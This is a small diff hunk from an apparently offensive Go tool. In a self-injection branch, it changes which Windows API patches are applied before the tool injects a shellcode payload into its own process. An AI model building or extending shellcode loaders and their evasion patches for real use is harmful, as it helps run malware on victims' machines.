@@ -607,7 +607,7 @@ func main() {
 	if useSelfInjection {
 		// Self-injection
 		debug.Printfln("MAIN", "Injecting payload into current process (self-injection)\n")
-		winapi.ApplyCriticalPatches()
+		winapi.ApplyAllPatches()
 		err = winapi.NtInjectSelfShellcode(payload)
 		
 		if err != nil {
